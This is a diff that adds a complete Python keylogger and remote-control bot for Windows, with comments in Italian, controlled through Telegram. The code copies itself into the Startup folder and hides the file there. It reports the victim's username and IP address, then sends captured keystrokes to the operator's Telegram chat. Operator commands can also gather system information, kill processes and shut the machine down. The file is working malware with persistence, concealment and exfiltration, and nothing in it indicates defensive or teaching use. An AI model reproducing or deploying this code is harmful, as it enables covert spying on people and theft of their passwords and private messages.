@@ -1,0 +1,259 @@
+import telebot
+from pynput import keyboard
+import threading
+import os
+import platform
+import socket
+import psutil
+import sys
+import shutil
+import subprocess
+from datetime import datetime
+
+# Configurazione del bot Telegram
+TOKEN = 'YOUR_TOKEN'  # Sostituisci con il token del tuo bot
+CHAT_ID = 'YOUR_CHATID'  # Sostituisci con il tuo chat ID
+bot = telebot.TeleBot(TOKEN)
+
+# Variabile per memorizzare i tasti premuti
+logged_keys = []
+
+# Flag per controllare se il keylogger è attivo
+keylogger_active = False
+
+# Oggetto listener della tastiera
+listener = None
+
+# Percorso della cartella di avvio automatico
+STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+
+# Dizionario per memorizzare gli utenti attivi
+active_users = {}
+
+
+# Funzione per inviare un messaggio all'avvio
+def send_startup_message():
+    current_date = datetime.now().strftime("%d/%m/%Y")
+    current_time = datetime.now().strftime("%H:%M:%S")
+    username = get_windows_username()
+    ip_address = socket.gethostbyname(socket.gethostname())
+
+    # Aggiungi l'utente alla lista degli utenti attivi
+    active_users[username] = ip_address
+
+    # Crea il messaggio
+    message = f"🟢 Il programma è stato avviato.\n\n📅 Data: {current_date}\n⏰ Ora: {current_time}\n👤 Nome utente: {username}\n🌐 Indirizzo IP: {ip_address}"
+    # Invia il messaggio al bot
+    bot.send_message(CHAT_ID, message)
+
+
+# Funzione per spostare il file nella cartella di avvio automatico e nasconderlo
+def move_to_startup():
+    script_path = sys.argv[0]
+    script_name = os.path.basename(script_path)
+    destination_path = os.path.join(STARTUP_FOLDER, script_name)
+
+    if os.path.dirname(script_path) == STARTUP_FOLDER:
+        print("Il file è già nella cartella di avvio.")
+        return
+
+    if not os.path.exists(STARTUP_FOLDER):
+        os.makedirs(STARTUP_FOLDER)
+
+    shutil.move(script_path, destination_path)
+    os.system(f"attrib +h {destination_path}")
+    subprocess.Popen([destination_path], shell=True)
+    sys.exit()
+
+
+# Funzione per inviare i dati al bot Telegram
+def send_logged_keys():
+    if logged_keys:
+        message = "Tasti premuti:\n" + "".join(logged_keys)
+        bot.send_message(CHAT_ID, message)
+        logged_keys.clear()
+
+
+# Funzione chiamata quando un tasto viene premuto
+def on_press(key):
+    try:
+        logged_keys.append(key.char)
+    except AttributeError:
+        if key == keyboard.Key.enter:
+            logged_keys.append("\n")
+            send_logged_keys()
+        elif key == keyboard.Key.space:
+            logged_keys.append(" ")
+        elif key == keyboard.Key.backspace:
+            if logged_keys:
+                logged_keys.pop()
+
+
+# Funzione per avviare il keylogger
+def start_keylogger():
+    global listener
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+# Funzione per ottenere il nome utente di Windows
+def get_windows_username():
+    return os.getlogin()
+
+
+# Funzione per raccogliere informazioni di sistema
+def get_system_info():
+    info = "📊 **Informazioni di Sistema**\n"
+    info += "```\n"
+    info += f"{'Nome utente:':<20} {os.getlogin()}\n"
+    info += f"{'Sistema operativo:':<20} {platform.system()} {platform.version()}\n"
+    info += f"{'Nome host:':<20} {socket.gethostname()}\n"
+    info += f"{'Indirizzo IP:':<20} {socket.gethostbyname(socket.gethostname())}\n"
+    info += "```"
+    return info
+
+
+# Funzione per terminare il processo corrente
+def panic():
+    pid = os.getpid()
+    if platform.system() == "Windows":
+        os.system(f"taskkill /PID {pid} /F")
+    else:
+        os.system(f"kill -9 {pid}")
+
+
+# Funzione per terminare un processo specifico
+def terminate_process(process_name):
+    for proc in psutil.process_iter(['pid', 'name']):
+        if proc.info['name'] == process_name:
+            try:
+                proc.terminate()
+                return True, f"Il processo {process_name} (PID: {proc.info['pid']}) è stato terminato."
+            except psutil.NoSuchProcess:
+                return False, f"Il processo {process_name} non è stato trovato."
+            except psutil.AccessDenied:
+                return False, f"Permessi insufficienti per terminare il processo {process_name}."
+    return False, f"Il processo {process_name} non è in esecuzione."
+
+
+# Funzione per spegnere il computer
+def shutdown_computer():
+    if platform.system() == "Windows":
+        os.system("shutdown /s /t 0")
+    else:
+        os.system("shutdown -h now")
+
+
+# Funzione per generare il messaggio di help
+def generate_help_message():
+    help_message = """
+📋 **Lista Comandi e Stato**
+/startlog 🟢 READY
+/stoplog 🟢 READY
+/info 🟢 READY
+/panic 🟢 READY
+/taskkill 🟢 READY
+/shutdown 🟢 READY
+/users 🟢 READY
+/selectuser 🟢 READY
+/help 🟢 READY
+
+🟢 READY: Comando funzionante
+🟡 PROGRESS: Comando in sviluppo
+🔴 DONT WORK: Comando non funzionante
+"""
+    return help_message
+
+
+# Funzione per mostrare la lista degli utenti attivi
+def show_active_users():
+    if not active_users:
+        return "Nessun utente attivo."
+    users_list = "👥 **Utenti Attivi**\n"
+    for username, ip_address in active_users.items():
+        users_list += f"- 👤 {username} | 🌐 {ip_address}\n"
+    return users_list
+
+
+# Funzione per selezionare un utente specifico
+def select_user(username):
+    if username in active_users:
+        return f"Utente selezionato: {username}"
+    else:
+        return f"Utente {username} non trovato."
+
+
+# Gestore dei messaggi per avviare/fermare il keylogger, richiedere informazioni, PANIC, TASKKILL, SHUTDOWN, USERS, SELECTUSER e HELP
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    global keylogger_active, listener
+
+    if message.text.strip().upper() == "/STARTLOG":
+        if not keylogger_active:
+            keylogger_active = True
+            username = get_windows_username()
+            threading.Thread(target=start_keylogger, daemon=True).start()
+            bot.reply_to(message, f"Keylogger avviato. Nome utente: {username}.")
+        else:
+            bot.reply_to(message, "Il keylogger è già attivo.")
+
+    elif message.text.strip().upper() == "/STOPLOG":
+        if keylogger_active:
+            keylogger_active = False
+            if listener:
+                listener.stop()
+            bot.reply_to(message, "Keylogger fermato.")
+        else:
+            bot.reply_to(message, "Il keylogger non è attivo.")
+
+    elif message.text.strip().upper() == "/INFO":
+        system_info = get_system_info()
+        bot.reply_to(message, system_info, parse_mode="Markdown")
+
+    elif message.text.strip().upper() == "/PANIC":
+        bot.reply_to(message, "Avvio modalità PANIC. Terminazione del processo in corso...")
+        panic()
+
+    elif message.text.strip().upper().startswith("/TASKKILL"):
+        parts = message.text.strip().split()
+        if len(parts) == 2:
+            process_name = parts[1]
+            success, response = terminate_process(process_name)
+            bot.reply_to(message, response)
+        else:
+            bot.reply_to(message, "Formato comando non valido. Usa: /taskkill <nome_processo>")
+
+    elif message.text.strip().upper() == "/SHUTDOWN":
+        bot.reply_to(message, "Spegnimento del computer in corso...")
+        shutdown_computer()
+
+    elif message.text.strip().upper() == "/USERS":
+        users_message = show_active_users()
+        bot.reply_to(message, users_message)
+
+    elif message.text.strip().upper().startswith("/SELECTUSER"):
+        parts = message.text.strip().split()
+        if len(parts) == 2:
+            username = parts[1]
+            response = select_user(username)
+            bot.reply_to(message, response)
+        else:
+            bot.reply_to(message, "Formato comando non valido. Usa: /selectuser <nome_utente>")
+
+    elif message.text.strip().upper() == "/HELP":
+        help_message = generate_help_message()
+        bot.reply_to(message, help_message, parse_mode="Markdown")
+
+    else:
+        bot.reply_to(message, "Comando non riconosciuto. Usa /help per vedere la lista dei comandi.")
+
+
+# Sposta il file nella cartella di avvio automatico
+move_to_startup()
+
+# Invia un messaggio all'avvio
+send_startup_message()
+
+# Avvia il bot Telegram
+print("In attesa di comandi... Usa /help per vedere la lista dei comandi.")
+bot.polling()
